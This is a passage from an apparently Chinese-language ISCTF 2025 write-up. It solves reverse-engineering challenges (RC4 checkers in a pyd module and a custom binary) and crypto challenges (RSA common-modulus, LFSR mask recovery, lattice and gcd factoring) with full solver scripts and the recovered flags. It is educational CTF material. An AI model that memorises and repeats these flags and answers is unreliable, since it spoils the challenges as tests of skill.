x_vals]) print(&quot;Flag:&quot;, flag_bytes.decode(&#x27;ascii&#x27;))else: print(&quot;No solution!&quot;) # Flag: ISCTF&#123;yR_A_Zzz_Ma5t3R!&#125; ezpy 题目描述：这是什么库？没见过呢 下载附件，是pyinstaller处理的ezpy.exe，按照之前做法，得到extracted文件夹， 反编译ezpy.pyc得到： try: from mypy import checkdef main(): user_input = input(&#x27;Please input your flag: &#x27;).strip() if check(user_input): print(&#x27;Correct!&#x27;) return Noneif __name__ == &#x27;__main__&#x27;: main()except ImportError: print(&#x27;Error: Cannot import mypy module&#x27;) exit(1) 没什么用，继续找。在目录里看到了mypy.cp313-win_amd64.pyd，想着用IDA反编译试试… 在IDA中，Shift+F12看到RC4 flag checker module，得到是RC4加密， 通过一个一个函数查看的艰难寻找，在sub_36F4D1519函数中得到RC4加密的密钥ISCTF2025： &#123; char *v2; // rsi __m128i *v3; // rbx __m128i *v5; // rax unsigned int v6; // eax __int64 v7; // rax char v8[274]; // [rsp+26h] [rbp-132h] BYREF char *Str; // [rsp+138h] [rbp-20h] BYREF strcpy(v8, &quot;ISCTF2025&quot;); if ( !(unsigned int)PyArg_ParseTuple(a2, &amp;unk_36F4D4000, &amp;Str) ) return 0LL; v2 = Str; v3 = (__m128i *)Py_FalseStruct; if ( (unsigned int)strlen(Str) == 25 ) &#123; v5 = (__m128i *)malloc(0x19uLL); v3 = v5; if ( v5 ) &#123; *v5 = _mm_loadu_si128((const __m128i *)v2); *(__m128i *)((char *)v5 + 9) = _mm_loadu_si128((const __m128i *)(v2 + 9)); v6 = strlen(v8); sub_36F4D1430(&amp;v8[10], v8, v6); sub_36F4D149C(&amp;v8[10], v3, 25LL); v7 = 0LL; while ( v3-&gt;m128i_i8[v7] == byte_36F4D4050[v7] ) &#123; if ( ++v7 == 25 ) &#123; free(v3); return (__m128i *)Py_TrueStruct; &#125; &#125; free(v3); return (__m128i *)Py_FalseStruct; &#125; else &#123; PyErr_NoMemory(); &#125; &#125; return v3;&#125; 生成RC4的S-box，写入v8[i]，然后执行cipher[i] = plain[i] XOR RC4_next()。 查看汇编代码，得到byte_36F4D4050的数据： 最终的EXP： cipher = bytes([ 0x1D,0xD5,0x38,0x33,0xAF,0xB5,0x51,0xF3,0x2C,0x6B, 0x6E,0xFE,0x41,0x24,0x43,0xD2,0x71,0xCF,0xA4,0x4C, 0xE3,0x9A,0x9A,0xB5,0x31])key = b&quot;ISCTF2025&quot;def rc4_ksa(key): S = list(range(256)) j = 0 for i in range(256): j = (j + S[i] + key[i % len(key)]) &amp; 0xFF S[i], S[j] = S[j], S[i] return Sdef rc4_prga(S, n): i = j = 0 out = [] for _ in range(n): i = (i + 1) &amp; 0xFF j = (j + S[i]) &amp; 0xFF S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) &amp; 0xFF] out.append(K) return bytes(out)S = rc4_ksa(key)keystream = rc4_prga(S, len(cipher))plain = bytes([c ^ k for c, k in zip(cipher, keystream)])print(plain)# flag: ISCTF&#123;Y0U_GE7_7HE_PYD!!!&#125; MysteriousStream 题目描述：小曲冒着生命风险，读入了一个神秘的 payload.dat文件，为了不枉费小曲的艰辛……，你能逆向出被加密的秘密吗？ 下载附件，包含challenge和payload.dat文件，定位至main函数： &#123; FILE *v3; // rax FILE *v4; // r12 signed __int64 v5; // r14 char *v6; // rax char *v7; // rbp size_t v8; // r13 __int64 i; // rcx _BYTE v11[17]; // [rsp+7h] [rbp-41h] BYREF unsigned __int64 v12; // [rsp+18h] [rbp-30h] v12 = __readfsqword(0x28u); v3 = fopen(&quot;payload.dat&quot;, &quot;rb&quot;); if ( v3 ) &#123; v4 = v3; fseek(v3, 0LL, 2); v5 = ftell(v4); if ( v5 &lt; 0 ) &#123; puts(&quot;Get file size failed&quot;); fclose(v4); return 1; &#125; else &#123; fseek(v4, 0LL, 0); v6 = (char *)malloc(v5); v7 = v6; if ( v6 ) &#123; v8 = fread(v6, 1uLL, v5, v4); fclose(v4); if ( v5 == v8 ) &#123; qmemcpy(v11, &quot;P4ssXORSecr3tK3y!&quot;, sizeof(v11)); rc4_variant(v7, v8, &amp;v11[7], 10LL); if ( v8 ) &#123; for ( i = 0LL; i != v8; ++i ) v7[i] ^= v11[i % 7]; &#125; __printf_chk(1LL, &quot;Result: %s\\n&quot;, v7); free(v7); return 0; &#125; else &#123; __printf_chk(1LL, &quot;Read failed! Expected %ld bytes, got %zu bytes\\n&quot;, v5, v8); free(v7); return 1; &#125; &#125; else &#123; puts(&quot;Malloc memory failed&quot;); fclose(v4); return 1; &#125; &#125; &#125; else &#123; puts(&quot;payload.dat not found&quot;); return 1; &#125;&#125; 使用key = v11[7 : 7 + 10] = &quot;Secr3tK3y!&quot;加密，对payload (v7) 做RC4加密， 然后循环异或key_xor = v11[0:7] = b&quot;P4ssXOR&quot;和v7[i] = v7[i] XOR key_xor[i % 7]， 再看xor_cycle函数： &#123; unsigned __int64 i; // r8 __int64 result; // rax if ( a2 ) &#123; for ( i = 0LL; i != a2; ++i ) &#123; result = *(unsigned __int8 *)(a3 + i % a4); *(_BYTE *)(a1 + i) ^= result; &#125; &#125; return result;&#125; 和rc4_variant函数： &#123; _BYTE *v4; // r8 __int64 i; // rax unsigned __int64 v7; // rcx int v8; // ebx char v9; // r11 _BYTE *v10; // r9 char v11; // al _BYTE v13[264]; // [rsp+0h] [rbp-118h] unsigned __int64 v14; // [rsp+108h] [rbp-10h] v4 = a1; v14 = __readfsqword(0x28u); for ( i = 0LL; i != 256; ++i ) v13[i] = i; v7 = 0LL; LOBYTE(v8) = 0; do &#123; v9 = v13[v7]; v8 = (unsigned __int8)((v7 &amp; 0xAA) + v8 + v9 + *(_BYTE *)(a3 + v7 % a4)); v13[v7++] = v13[v8]; v13[v8] = v9; &#125; while ( v7 != 256 ); if ( a2 ) &#123; v10 = &amp;a1[a2]; LOBYTE(a1) = 0; LOBYTE(a2) = 0; do &#123; LODWORD(a1) = (unsigned __int8)((_BYTE)a1 + 1); v11 = v13[(unsigned int)a1]; LODWORD(a2) = (unsigned __int8)(v11 + a2); v13[(unsigned int)a1] = v13[(unsigned int)a2]; v13[(unsigned int)a2] = v11; *v4++ ^= v13[(unsigned __int8)(v13[(unsigned int)a1] + v11)]; &#125; while ( v10 != v4 ); &#125; return v14 - __readfsqword(0x28u);&#125; 变种的RC4加密逻辑为j = (j + S[i] + key[i % keylen] + (i &amp; 0xAA)) mod 256，解密只需逆着来即可。 所以，最终的加密逻辑为cipher = XOR( RC4_variant(plaintext, key=&quot;Secr3tK3y!&quot;) , key=&quot;P4ssXOR&quot;)。 EXP： def rc4_variant_crypt(data: bytes, key: bytes) -&gt; bytes: S = list(range(256)) j = 0 key_len = len(key) for i in range(256): j = ( (i &amp; 0xAA) + j + S[i] + key[i % key_len] ) &amp; 0xFF S[i], S[j] = S[j], S[i] out = bytearray() i = 0 j = 0 for byte in data: i = (i + 1) &amp; 0xFF j = (j + S[i]) &amp; 0xFF S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) &amp; 0xFF] out.append(byte ^ K) return bytes(out)def decrypt(cipher: bytes) -&gt; bytes: xor_key = b&quot;P4ssXOR&quot; rc4_key = b&quot;Secr3tK3y!&quot; tmp = bytearray(len(cipher)) for i in range(len(cipher)): tmp[i] = cipher[i] ^ xor_key[i % len(xor_key)] plain = rc4_variant_crypt(tmp, rc4_key) return plainif __name__ == &quot;__main__&quot;: with open(&quot;D:\\\\MysteriousStream\\\\payload.dat&quot;, &quot;rb&quot;) as f: cipher = f.read() plaintext = decrypt(cipher) print(plaintext.decode(errors=&quot;ignore&quot;)) # flag: ISCTF&#123;Y0u_a2e_2ea11y_a_1aby2inth_master&#125; CRYPTOeasy_RSA 题目描述：我们的爱情像欧拉函数φ(n)——无限趋近却永远达不到n的完美互质，最终只剩周期性的怀念在模n的世界里循环证明 下载加密代码： from Crypto.Util.number import *p = getPrime(1024)q = getPrime(1024)N = p*qe = 65537msg = bytes_to_long(b&quot;ISCTF&#123;dummy_flag&#125;&quot;)ct1 = pow(msg, e, N)ct2 = pow(msg, p+q, N)print(f&quot;&#123;N = &#125;&quot;)print(f&quot;&#123;ct1 = &#125;&quot;)print(f&quot;&#123;ct2 = &#125;&quot;)&quot;&quot;&quot;N = 17630258257080557797062320474423515967705950026415012912087655679315479168903980901728425140787005046038000068414269936806478828260848859753400786557270120330760791255046985114127285672634413513991988895166115794242018674042563788348381567565190146278040811257757119090296478610798393944581870309373529884950663990485525646200034220648901490835962964029936321155200390798215987316069871958913773199197073860062515329879288106446016695204426001393566351524023857332978260894409698596465474214898402707157933326431896629025197964209580991821222557663589475589423032130993456522178540455360695933336455068507071827928617ct1 = 5961639119243884817956362325106436035547108981120248145301572089585639543543496627985540773185452108709958107818159430835510386993354596106366458898765597405461225798615020342640056386757104855709899089816838805631480329264128349465229327090721088394549641366346516133008681155817222994359616737681983784274513555455340301061302815102944083173679173923728968671113926376296481298323500774419099682647601977970777260084799036306508597807029122276595080580483336115458713338522372181732208078117809553781889555191883178157241590455408910096212697893247529197116309329028589569527960811338838624831855672463438531266455ct2 = 11792054298654397865983651507912282632831471680334312509918945120797862876661899077559686851237832931501121869814783150387308320349940383857026679141830402807715397332316601439614741315278033853646418275632174160816784618982743834204997402866931295619202826633629690164429512723957241072421663170829944076753483616865208617479794763412611604625495201470161813033934476868949612651276104339747165276204945125001274777134529491152840672010010940034503257315555511274325831684793040209224816879778725612468542758777428888563266233284958660088175139114166433501743740034567850893745466521144371670962121062992082312948789&quot;&quot;&quot; 是RSA中的共模攻击，m = c1 ^ s1 * c2 ^ s2 mod N， 得到EXP： from Crypto.Util.number import long_to_bytes, inverseN = 17630258257080557797062320474423515967705950026415012912087655679315479168903980901728425140787005046038000068414269936806478828260848859753400786557270120330760791255046985114127285672634413513991988895166115794242018674042563788348381567565190146278040811257757119090296478610798393944581870309373529884950663990485525646200034220648901490835962964029936321155200390798215987316069871958913773199197073860062515329879288106446016695204426001393566351524023857332978260894409698596465474214898402707157933326431896629025197964209580991821222557663589475589423032130993456522178540455360695933336455068507071827928617ct1 = 5961639119243884817956362325106436035547108981120248145301572089585639543543496627985540773185452108709958107818159430835510386993354596106366458898765597405461225798615020342640056386757104855709899089816838805631480329264128349465229327090721088394549641366346516133008681155817222994359616737681983784274513555455340301061302815102944083173679173923728968671113926376296481298323500774419099682647601977970777260084799036306508597807029122276595080580483336115458713338522372181732208078117809553781889555191883178157241590455408910096212697893247529197116309329028589569527960811338838624831855672463438531266455ct2 = 11792054298654397865983651507912282632831471680334312509918945120797862876661899077559686851237832931501121869814783150387308320349940383857026679141830402807715397332316601439614741315278033853646418275632174160816784618982743834204997402866931295619202826633629690164429512723957241072421663170829944076753483616865208617479794763412611604625495201470161813033934476868949612651276104339747165276204945125001274777134529491152840672010010940034503257315555511274325831684793040209224816879778725612468542758777428888563266233284958660088175139114166433501743740034567850893745466521144371670962121062992082312948789e1 = 65537e2 = N + 1def extended_gcd(a, b): if a == 0: return b, 0, 1 else: g, y, x = extended_gcd(b % a, a) return g, x - (b // a) * y, yg, s1, s2 = extended_gcd(e1, e2)print(f&quot;[*] gcd(e1, e2) = &#123;g&#125;&quot;)print(f&quot;[*] s1 = &#123;s1&#125;&quot;)print(f&quot;[*] s2 = &#123;s2&#125;&quot;)if s1 &gt; 0: part1 = pow(ct1, s1, N)else: part1 = pow(inverse(ct1, N), -s1, N)if s2 &gt; 0: part2 = pow(ct2, s2, N)else: part2 = pow(inverse(ct2, N), -s2, N)msg_int = (part1 * part2) % Nflag = long_to_bytes(msg_int)print(&quot;-&quot; * 30)print(f&quot;[*] Decrypted Flag: &#123;flag&#125;&quot;)try: print(f&quot;[*] Decoded: &#123;flag.decode()&#125;&quot;)except: passprint(&quot;-&quot; * 30)# flag: ISCTF&#123;Congratulations_you_master_Mathematical_ability&#125; 小蓝鲨的LFSR系统 题目描述：”小蓝鲨是海洋情报局的新晋密码专家，它设计了一个基于LFSR的流密码系统来加密机密信息。这个系统看起来简单高效，但小蓝鲨不知道的是，LFSR在某些情况下可能存在安全隐患。 一天，小蓝鲨的加密系统被神秘的黑客组织””深海幽灵””入侵，他们截获了一段加密信息。作为海洋安全部门的成员，你需要分析这个加密系统，找出潜在的弱点，并解密被截获的信息。” 打开附件： import secretsimport binasciidef simple_lfsr_encrypt(plaintext, init_state): mask = [random.randint(0,1) for _ in range(128)] state = init_state.copy() for _ in range(256): feedback = sum(state[i] &amp; mask[i] for i in range(128)) % 2 state.append(feedback) key = bytes(int(&#x27;&#x27;.join(str(bit) for bit in mask[i*8:(i+1)*8]), 2) for i in range(16)) keystream = (key * (len(plaintext)//16 + 1))[:len(plaintext)] return bytes(p ^ k for p, k in zip(plaintext, keystream)), mask 和对应的输出文件： initState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0]outputState = [0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1]ciphertext = &#x27;4b3be165a0a0edd67ca8f143884826725107fd42d6a6&#x27; 构造线性方程组A * X = B，在GF(2)域上使用高斯消元法解出mask， EXP： import binasciiinitState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0]outputState = [0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1]ciphertext_hex = &#x27;4b3be165a0a0edd67ca8f143884826725107fd42d6a6&#x27;full_stream = initState + outputStateN = 128def gaussian_elimination_gf2(A, B): rows = len(A) cols = len(A[0]) aug_matrix = [row + [B[i]] for i, row in enumerate(A)] pivot_row = 0 for col in range(cols): if pivot_row &gt;= rows: break if aug_matrix[pivot_row][col] == 0: for i in range(pivot_row + 1, rows): if aug_matrix[i][col] == 1: aug_matrix[pivot_row], aug_matrix[i] = aug_matrix[i], aug_matrix[pivot_row] break else: continue for i in range(rows): if i != pivot_row and aug_matrix[i][col] == 1: aug_matrix[i] = [x ^ y for x, y in zip(aug_matrix[i], aug_matrix[pivot_row])] pivot_row += 1 solution = [0] * cols for i in range(rows): try: pivot_col = aug_matrix[i][:-1].index(1) solution[pivot_col] = aug_matrix[i][-1] except ValueError: pass return solutionmatrix = []results = []num_equations = len(outputState) print(f&quot;[*] Building &#123;num_equations&#125; equations from stream...&quot;)for i in range(min(num_equations, N + 20)): row = full_stream[i : i + N] res = full_stream[i + N] matrix.append(row) results.append(res)print(&quot;[*] Solving for Mask via Gaussian Elimination...&quot;)mask = gaussian_elimination_gf2(matrix, results)print(&quot;[*] Verifying Mask...&quot;, end=&quot; &quot;)state_test = initState.copy()generated_test = []for _ in range(len(outputState)): feedback = sum(state_test[k] &amp; mask[k] for k in range(128)) % 2 state_test.append(feedback)check_pass = Truefor i in range(len(outputState)): prediction = sum(full_stream[i+k] &amp; mask[k] for k in range(128)) % 2 if prediction != outputState[i]: check_pass = False breakif check_pass: print(&quot;SUCCESS! Mask perfectly regenerates the output.&quot;)else: print(&quot;WARNING: Mask verification failed. The LFSR logic might differ.&quot;)def decrypt_with_mode(mask_bits, ct_hex, mode_name): key_bytes = [] for i in range(16): bits = mask_bits[i*8 : (i+1)*8] if &quot;Little&quot; in mode_name: bits = bits[::-1] val = int(&#x27;&#x27;.join(str(b) for b in bits), 2) key_bytes.append(val) key = bytes(key_bytes) ct = binascii.unhexlify(ct_hex) keystream = (key * (len(ct)//16 + 1))[:len(ct)] pt = bytes(c ^ k for c, k in zip(ct, keystream)) try: pt_text = pt.decode(&#x27;utf-8&#x27;) if &quot;ISCTF&#123;&quot; in pt_text or &quot;uuid&quot; in pt_text or &quot;&#123;&quot; in pt_text: print(f&quot;\\n[+] SUCCESS (&#123;mode_name&#125;): &#123;pt_text&#125;&quot;) else: if all(32 &lt;= c &lt;= 126 for c in pt): print(f&quot;\\n[?] Possible Candidate (&#123;mode_name&#125;): &#123;pt_text&#125;&quot;) except: pass return ptprint(&quot;-&quot; * 30)print(&quot;[*] Attempting Decryption...&quot;)res1 = decrypt_with_mode(mask, ciphertext_hex, &quot;Standard Big-Endian&quot;)res2 = decrypt_with_mode(mask, ciphertext_hex, &quot;Little-Endian Bits&quot;)print(&quot;-&quot; * 30)print(f&quot;Key (Hex): &#123;bytes(int(&#x27;&#x27;.join(str(b) for b in mask[i*8:(i+1)*8]), 2) for i in range(16)).hex()&#125;&quot;)# flag: ISCTF&#123;lf5R_jUst_So_s0&#125; 小蓝鲨的RSA密文 题目描述：”小蓝鲨是海洋数学天才，它最近正在深耕RSA领域。你嗤之以鼻，心想RSA不是最基础的密码学知识吗？于是你信誓旦旦的跑到小蓝鲨面前告诉它你已经完全掌握了RSA，并宣称所有的RSA题目你都能做出来。 小蓝鲨意味深长的看了你一眼，并出了一道RSA来考考你。现在，该你向它证明你的实力了。” 打开.py文件， import json, secretsfrom Crypto.Util.number import getPrime, bytes_to_longfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import pade = 3N = getPrime(512) * getPrime(512)a2_high = a2 &gt;&gt; LOW_BITSaes_key = secrets.token_bytes(16)m = bytes_to_long(aes_key)f = a2 * (m * m) + a1 * m + a0c = (pow(m, e) + f) % Niv = secrets.token_bytes(16)cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv)ct = cipher.encrypt(pad(FLAG, 16))&quot;&quot;&quot;N = 121288600621198389662246479277632294800423697823363188896668775456771641807233781416525282234787873435904747571468452950479817935684848143651716343606633656969395065588423982440884464542428742861388200306417822228591316703916504170245990423925894477848679490979364923848426643149659758241239900845544537886777c = 3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117a2_high = 9012778LOW_BITS = 16a1 = 621315a0 = 452775142iv = bf38e64bb5c1b069a07b7d1d046a9010ct = 8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5&quot;&quot;&quot; 模数N(两512位素数乘积）过大，而m(AES-key)只有128位 我们可以采用爆破low_bits，遍历0 - 65535的所有可能值，构造完整的a2；再求解三次方程m^3 + a2*m^2 + a1*m + (a0 - c) = 0；用二分查找找到m；最后，用找到的密钥m解密ct即可得到flag。 EXP： import sysfrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadc = 3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117a2_high = 9012778LOW_BITS = 16a1 = 621315a0 = 452775142iv_hex = &quot;bf38e64bb5c1b069a07b7d1d046a9010&quot;ct_hex = &quot;8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5&quot;iv = bytes.fromhex(iv_hex)ct = bytes.fromhex(ct_hex)def solve_cubic_for_m(target_a2): low = 0 high = 1 &lt;&lt; 130 while low &lt;= high: mid = (low + high) // 2 val = mid**3 + target_a2 * (mid**2) + a1 * mid + a0 if val == c: return mid elif val &lt; c: low = mid + 1 else: high = mid - 1 return Noneprint(&quot;[*] 开始爆破 a2 的低 16 位...&quot;)found_m = Nonefor low_part in range(2**LOW_BITS): current_a2 = (a2_high &lt;&lt; LOW_BITS) + low_part res = solve_cubic_for_m(current_a2) if res is not None: found_m = res print(f&quot;[+] 找到唯一解 m: &#123;found_m&#125;&quot;) print(f&quot;[+] 对应的 a2 低位为: &#123;low_part&#125;&quot;) breakif found_m: try: aes_key = long_to_bytes(found_m) if len(aes_key) &lt; 16: aes_key = aes_key.rjust(16, b&#x27;\\0&#x27;) cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv) decrypted = cipher.decrypt(ct) flag = unpad(decrypted, 16) print(f&quot;\\n[SUCCESS] Flag: &#123;flag.decode()&#125;&quot;) except Exception as e: print(f&quot;[ERROR] 解密失败: &#123;e&#125;&quot;)else: print(&quot;[-] 未找到符合条件的 m&quot;) # flag: ISCTF&#123;i7_533M5_Lik3_You_R34lLy_UNd3R574nd_Polinomials_4nD_RSA&#125; baby_math 题目描述：死去的记忆突然被唤醒了 打开： from Crypto.Util.number import bytes_to_longprint(len(flag)) R = RealField(1000)a,b = bytes_to_long(flag[:len(flag)//2]),bytes_to_long(flag[len(flag)//2:])x = R(0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100) enc = a*cos(x)+b*sin(x) #1.24839978408728580181183027675785982784764821592156892598136000363397267152291738689909414790691435938223032351375697399608345468567445269769342300325192248438038963977207296241971217955178443170598629648414706345216797043374408541203167719396818925953801387623884200901703606288664141375049626635852e52 给出a * cos(x) + b * sin(x) = enc，此为背包问题的变种 可以利用&#96;&#96;&#96;LLL算法&#96;&#96;，构造格，构造矩阵使得目标向量为格的一个短向量，利用格基约减求解。 EXP： from Crypto.Util.number import long_to_bytesfrom sage.all import *x_val_str = &quot;0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100&quot;enc_val_str = &quot;1.24839978408728580181183027675785982784764821592156892598136000363397267152291738689909414790691435938223032351375697399608345468567445269769342300325192248438038963977207296241971217955178443170598629648414706345216797043374408541203167719396818925953801387623884200901703606288664141375049626635852e52&quot;R = RealField(1000)x = R(x_val_str)enc = R(enc_val_str)K = 10**300 M = Matrix(ZZ, [ [1, 0, int(K * cos(x))], [0, 1, int(K * sin(x))], [0, 0, int(K * enc)]])M_reduced = M.LLL()vec = M_reduced[0]a = abs(vec[0])b = abs(vec[1])print(f&quot;[+] Found a: &#123;a&#125;&quot;)print(f&quot;[+] Found b: &#123;b&#125;&quot;)try: part1 = long_to_bytes(a) part2 = long_to_bytes(b) flag = part1 + part2 print(f&quot;\\n[SUCCESS] Flag: &#123;flag.decode()&#125;&quot;)except Exception as e: print(f&quot;[-] Decode failed: &#123;e&#125;&quot;)# [SUCCESS] Flag: ISCTF&#123;164a3221-7306-4024-88c3-4ef557b86895&#125; 小蓝鲨的费马谜题 题目描述：小蓝鲨在一次网络探险中发现了一个神秘的加密系统。他发现这个系统好像使用了费马小定理来保护重要信息，但是又好像不太一样。小蓝鲨设法截获了系统的加密输出，但不知道如何解密，你可以帮帮它吗？ 打开，还有25KB的output.txt： import randomimport mathp = get_prime(1024)q = get_prime(1024)n = p * qe = 65537m = bytes_to_long(flag)c = pow(m, e, n)bases = get_primes_up_to(100)hints = []for i in range(len(bases)): for j in range(i+1, len(bases)): hint_value = (pow(bases[i], p-1, n) + pow(bases[j], p-1, n)) % n hints.append((bases[i], bases[j], hint_value)) 根据给定的hint：H(a,b) = a ^ (p - 1) + b ^ (p - 1) mod n 与费马小定理b ^ (p - 1) = c ^ (p - 1) = 1 (mod p) 得出p = gcd(H(a,b) - H(a , c), n) 所以，EXP： import refrom math import gcdfrom Crypto.Util.number import long_to_bytes, inversepath = &quot;D:\\\\task\\\\output.txt&quot; with open(path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: txt = f.read()m_n = re.search(r&quot;n\\s*=\\s*([0-9]+)&quot;, txt)m_e = re.search(r&quot;e\\s*=\\s*([0-9]+)&quot;, txt)m_c = re.search(r&quot;c\\s*=\\s*([0-9]+)&quot;, txt)if not (m_n and m_e and m_c): print(&quot;未能从文件中读取 n/e/c，请确认输出格式与样例一致。&quot;) raise SystemExit(1)n = int(m_n.group(1))e = int(m_e.group(1))c = int(m_c.group(1))print(&quot;Loaded n,e,c&quot;)hint_tuples = re.findall(r&quot;Hint\\s*\\d+:\\s*(\\d+),\\s*(\\d+),\\s*([0-9]+)&quot;, txt)hints = [(int(a), int(b), int(val)) for (a,b,val) in hint_tuples]print(&quot;Loaded&quot;, len(hints), &quot;hints&quot;)from collections import defaultdictgroups1 = defaultdict(list)groups2 = defaultdict(list)for idx, (a,b,val) in enumerate(hints, start=1): groups1[a].append((idx,a,b,val)) groups2[b].append((idx,a,b,val))def try_pairs(pairs): results = [] for i in range(len(pairs)): for j in range(i+1, len(pairs)): idx1,a1,b1,H1 = pairs[i] idx2,a2,b2,H2 = pairs[j] delta = (H1 - H2) % n g = gcd(delta, n) if 1 &lt; g &lt; n: results.append((idx1, a1,b1, idx2, a2,b2, g)) return resultsfound = []for a, items in groups1.items(): if len(items) &gt;= 2: res = try_pairs(items) if res: found.extend(res)if found: print(&quot;Found factor(s) by matching same base1:&quot;) for it in found: print(it)else: print(&quot;No factor found by matching same base1. Trying same base2...&quot;) found2 = [] for b, items in groups2.items(): if len(items) &gt;= 2: res = try_pairs(items) if res: found2.extend(res) if found2: print(&quot;Found factor(s) by matching same base2:&quot;) for it in found2: print(it) found = found2if not found: print(&quot;No factor found by same-base heuristics. Scanning all pairs (this may take some seconds)...&quot;) all_pairs = [] for i in range(len(hints)): for j in range(i+1, len(hints)): a1,b1,H1 = hints[i] a2,b2,H2 = hints[j] delta = (H1 - H2) % n g = gcd(delta, n) if 1 &lt; g &lt; n: all_pairs.append((i+1,a1,b1,j+1,a2,b2,g)) if all_pairs: print(&quot;Found by scanning all pairs:&quot;) for it in all_pairs: print(it) found = all_pairs else: print(&quot;每个 base1 的 hint 数量：&quot;) for a, items in sorted(groups1.items()): print(&quot;base1 =&quot;, a, &quot;count =&quot;, len(items)) raise SystemExit(2)g = found[0][-1]p = int(g)if n % p != 0: print(&quot;警告: gcd 没能整除n:&quot;, p) raise 